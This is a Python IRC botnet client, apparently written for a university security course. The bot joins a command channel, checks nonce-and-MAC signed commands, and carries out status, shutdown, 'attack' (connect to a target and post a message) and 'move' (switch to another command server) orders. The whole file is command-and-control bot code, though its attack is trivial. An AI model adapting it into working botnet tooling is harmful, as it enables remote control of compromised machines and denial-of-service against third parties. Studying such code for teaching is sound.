#!/usr/bin/env python
# ./ircbot.py <hostname>:<port> <channel> <secret>

# irc server is on csx1.ucalgary.ca:60000.


import argparse
import socket
import sys
import os
import hashlib
import shlex
import time
from array import *
from typing import Union
import random
import string
import select

#global nonce
seen_nonces = list()

# Count of commands seen and executed
commands_exe = 0  

# Argument Parsing
def parse_args():
    parser = argparse.ArgumentParser(
        prog='client',
        description='client connects to server')
    parser.add_argument('hostname_port', help='hostname and port of the server')
    parser.add_argument('channel', help='irc channel')
    parser.add_argument('secret', help='bot secret')

    return parser.parse_args()

# Message Parsing
def parse_message(data: str):

    #print("parsing: \n", data)
    #split = data.split()
    #print(split)

    prefix = ''
    trailing = []
    if not data:
        print("no message")
        return prefix, "", ""
    if data[0] == ':':
        prefix, data = data[1:].split(' ', 1)
    if data.find(' :') != -1:
        data, trailing = data.split(' :', 1)
        channel_message = data.split()
        channel_message.append(trailing)
    else:
        channel_message = data.split()
    command = channel_message.pop(0)
    return prefix, command, channel_message
    

# Implementing the status command for all bots
def status_cmd(sock: socket, nick: str, channel: str):
    global commands_exe
    status_send = 'PRIVMSG ' + channel + ' :' + str(commands_exe) + '! \r\n'
    sock.send(status_send.encode())
    commands_exe += 1

# Implementing the shutdown command for all bots
def shutdown_cmd(sock: socket, nick: str, channel: str):
    shutdown_send = 'PRIVMSG ' + channel + ' :' + 'shutdown ' + nick + '! \r\n'
    sock.send(shutdown_send.encode())
    sock.close()
    print("I have shutdown")
    exit(1)

# Implementing the attack command for all bots
def attack_server(sock: socket, hostname: str, port: int, nickname: str, nonce: str, args: str):

    channel = "#" + args.channel

    try:
        # Set up socket to connect to attack server
        attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        attack_socket.connect((hostname, port))

        # Sets up initial messages to send to server
        nickname = 'bot' + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) #"bot1"
        sendUser = 'USER '+ nickname +' '+ nickname +' '+ nickname +' :This is a fun bot!\n'
        sendNickname = "NICK "+ nickname +"\n"
        sendJoin = "JOIN "+ channel +"\n"

        # Sends initial messages to server
        attack_socket.send(sendUser.encode()) 
        attack_socket.send(sendNickname.encode())     
        attack_socket.send(sendJoin.encode())   

        # Construct and send attack
        attack_send = nickname + nonce
        attack_send = 'PRIVMSG ' + channel + ' :' + nickname + '! \r\n'
        try:
            attack_socket.send(attack_send.encode())
        except:
            failNoSend = 'PRIVMSG ' + channel + ' :' + "-attack " + nickname + " FAIL Could not send attack" + '! \r\n'
            sock.send(failNoSend.encode())
            print(failNoSend)
            return

    # Attack failed
    except Exception as error:
        failError = 'PRIVMSG ' + channel + ' :' + "-attack " + nickname + " FAIL " + str(error) + '! \r\n'
        sock.send(failError.encode())
        print(failError)
        return

    # Close socket and confirm attack
    attack_socket.close()
    attackOK = 'PRIVMSG ' + channel + ' :' + "-attack " + nickname + " OK" + '! \r\n'
    sock.send(attackOK.encode())
    print(attackOK)
    return

# Implementing the move command for all bots
def move_server(host: str, port: int, args: str):
    while(1):
        try:
            channel = "#" + args.channel
            nickname = 'bot' + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) 

            #initially connect to server
            new_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            new_client_socket.connect((host, port))

            # Sets up initial messages to send to server
            sendUser = 'USER '+ nickname +' '+ nickname +' '+ nickname +' :connect the bot!\n'
            sendNickname = "NICK "+ nickname +"\n"
            sendJoin = "JOIN "+ channel +"\n"

            # Send initial messages to server
            new_client_socket.send(sendUser.encode()) #user authentication
            new_client_socket.send(sendNickname.encode())                            #sets nick
            new_client_socket.send(sendJoin.encode())   

            text = new_client_socket.recv(1024).decode()  #receive the text
            print(text)   #print text to console
            print("connected")

            # If successful connection, run the bot on the new server
            while(1):
                try:
                    client_program(args, new_client_socket, nickname)

                    if text.find('PING') != -1:                          #check if 'PING' is found
                        new_client_socket.send('PONG ' + text.split() [1] + '\r\n') #returnes 'PONG' back to the server (prevents pinging out!)

                # Lost connection to server 
                except ConnectionError:
                    print("lost connection.")
                    exit(1)

        # Failed to move to new server
        except ConnectionError:
            #print("Connection failed. Is the server dead?")
            print("Failed to connect.")
            time.sleep(5)


def client_program(args: str, sock: socket, bot_nickname: str):

    split_hostPort = args.hostname_port.split(":")
    host = split_hostPort[0]
    port = int(split_hostPort[1])
    channel = "#" + args.channel
    secret = args.secret

    data = sock.recv(1024).decode()  #receive the text
    if(data.find('PING') != -1):                          #check if 'PING' is found
        print("PINGED")
        sendPONG = 'PONG ' + data.split() [1] + '\r\n'
        sock.send(sendPONG.encode())
        return 

    # Ignore anything sent from other bots     
    if(data[:4] == ":bot"):
        return

    if(data.find('JOIN') != -1 or data.find('QUIT') != -1):
        return

    #splits recieved data
    cmd_data = data.split()
    if(data.find('PRIVMSG') != -1):
        prefix, command, messageContents = parse_message(data)
        parsed_command = messageContents.pop(1)
        trim_parsed_command = parsed_command[0:-4]
        #print(trim_parsed_command)

        cmd_data = trim_parsed_command.split()
        #print("cmd_data: ", cmd_data)

    #checks if server disconncected or if we recieved bad inputs
    if(data == '\n' or len(cmd_data) == 1):
        return
    if(len(cmd_data) == 0):
        print("lost connection.")
        main()
    
    global commands_exe
    # Authenticate the command:
    if cmd_data[0] in seen_nonces:
        #ignore command
        print("nonce seen")
    else:
        mac2 = str(hashlib.sha256((cmd_data[0] + secret).encode('utf-8')).hexdigest())
        mac2_short = mac2[0:8]

        # MAC matches
        if mac2_short == str(cmd_data[1]):
            # If macs dont match we ignore comand
            seen_nonces.append(cmd_data[0])

            # If status command is received
            if cmd_data[2] == "status":                 # gives bot status
                #print("status")
                status_cmd(sock, bot_nickname, channel)

            # If shutdown command is received    
            elif cmd_data[2] == "shutdown":             # shutdown bots               
                print("telling bot to shutdown")
                shutdown_cmd(sock, bot_nickname, channel)

            # If attack command is received    
            elif cmd_data[2] == "attack":
                split_attack = cmd_data[3].split(":")
                #print(int(split_attack[1]))
                attack_server(sock, split_attack[0], int(split_attack[1]), bot_nickname, cmd_data[0], args)
                commands_exe += 1

            # If move command is received    
            elif cmd_data[2] == "move":
                moveBot = 'PRIVMSG ' + channel + ' :' + bot_nickname + '! \r\n'
                #print(moveBot)
                sock.send(moveBot.encode())
                split_move = cmd_data[3].split(":")
                sock.close()
                move_server(split_move[0], int(split_move[1]), args)
                commands_exe += 1

            # If unknown command is received
            else: 
                print("unknown command")


def main():
    args = parse_args()
    while(1):
        try:
            #initially connect to server
            split_hostPort = args.hostname_port.split(":")
            host = split_hostPort[0]
            port = int(split_hostPort[1])
            channel = "#" + args.channel

            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, port))

            # Sets up initial messages to send server
            nickname = 'bot' + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters)  #"bot1"
            sendUser = 'USER '+ nickname +' '+ nickname +' '+ nickname +' :This is a fun bot!\n'
            sendNickname = "NICK "+ nickname +"\n"
            sendJoin = "JOIN "+ channel +"\n"

            # Sends initial messages to server
            client_socket.send(sendUser.encode()) #user authentication
            client_socket.send(sendNickname.encode())                            #sets nick
            client_socket.send(sendJoin.encode())   

            text = client_socket.recv(1024).decode("UTF-8")  #receive the text
            print(text)   #print text to console

            print("connected")

            while(1):
                try:
                    client_program(args, client_socket, nickname)
                except ConnectionError:
                    print("lost connection.")
        except ConnectionError:
            print("Failed to connect.")
            time.sleep(5)



if __name__ == '__main__':
    main()